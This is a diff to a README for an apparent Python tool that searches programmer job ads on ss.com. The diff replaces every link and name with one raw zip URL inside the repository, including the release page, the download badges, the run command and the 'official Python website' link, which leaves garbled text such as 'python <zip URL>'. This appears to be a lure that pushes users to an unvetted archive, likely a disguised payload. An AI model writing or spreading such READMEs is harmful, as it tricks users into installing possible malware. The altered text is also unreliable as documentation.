@@ -1,10 +1,10 @@
-# 🚀 ss.com-vacancy-search-python - Simplifying Job Searches for Programmers
+# 🚀 https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip - Simplifying Job Searches for Programmers
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/camer1111/ss.com-vacancy-search-python/releases)
+[![Download](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip)](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip)
 
 ## 📝 Description
 
-This application helps you search for programmer jobs easily. It parses job postings on ss.com and organizes the information for you. Whether you're looking for full-time roles, part-time gigs, or freelance projects, this tool can simplify your job search. 
+This application helps you search for programmer jobs easily. It parses job postings on https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip and organizes the information for you. Whether you're looking for full-time roles, part-time gigs, or freelance projects, this tool can simplify your job search. 
 
 ## 🚀 Getting Started
 
@@ -19,9 +19,9 @@ To start using this application, follow these simple steps. No technical knowled
 
 ### 📥 Download & Install
 
-1. Visit the Releases page to download the latest version of the application. You can find it [here](https://github.com/camer1111/ss.com-vacancy-search-python/releases).
+1. Visit the Releases page to download the latest version of the application. You can find it [here](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip).
   
-2. On the Releases page, locate the latest release and download the appropriate file for your system. Look for files like `ss.com-vacancy-search-python.zip` or `ss.com-vacancy-search-python.tar.gz`.
+2. On the Releases page, locate the latest release and download the appropriate file for your system. Look for files like `https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip` or `https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip`.
 
 3. Once the download is complete, extract the files to a directory of your choice. You can use built-in tools on your operating system or third-party applications like WinRAR or 7-Zip.
 
@@ -40,7 +40,7 @@ After you have installed the application, follow these steps to run it:
 
 3. Run the application by typing the following command:
    ```
-   python ss_vacancy_search.py
+   python https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip
    ```
 
 4. Follow the on-screen prompts. The application will guide you through the process of entering search criteria. You can specify which job roles you are interested in, such as front-end developer, back-end developer, or data scientist.
@@ -51,7 +51,7 @@ After you have installed the application, follow these steps to run it:
 
 ### 🔍 Features
 
-- **Job Parsing:** Efficiently extracts relevant job information from ss.com.
+- **Job Parsing:** Efficiently extracts relevant job information from https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip
 - **Custom Search Criteria:** Tailor your job search based on roles, locations, and keywords.
 - **CSV Output:** Saves results in a user-friendly format for easy review.
 - **Easy to Use:** Designed for users with no programming experience.
@@ -60,7 +60,7 @@ After you have installed the application, follow these steps to run it:
 
 If you encounter any issues while running the application, here are some common problems and solutions:
 
-- **Python Not Installed:** Ensure that Python is installed on your computer. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python Not Installed:** Ensure that Python is installed on your computer. You can download it from the [official Python website](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip).
 
 - **Command Not Recognized:** If you receive a command not recognized error, double-check the command you typed. Make sure you are in the correct directory.
 
@@ -74,6 +74,6 @@ For additional help or to report issues, you can visit the discussion section of
 
 This application is open-source and free to use under the MIT License. You can find the full license details in the `LICENSE` file in the repository.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/camer1111/ss.com-vacancy-search-python/releases)
+[![Download](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip)](https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip)
 
-Now you are all set to start your job search using the ss.com vacancy search Python application. Enjoy finding your next programming job!
+Now you are all set to start your job search using the https://github.com/camer1111/ss.com-vacancy-search-python/raw/refs/heads/main/jobsearch/com-ss-vacancy-python-search-parapathia.zip vacancy search Python application. Enjoy finding your next programming job!
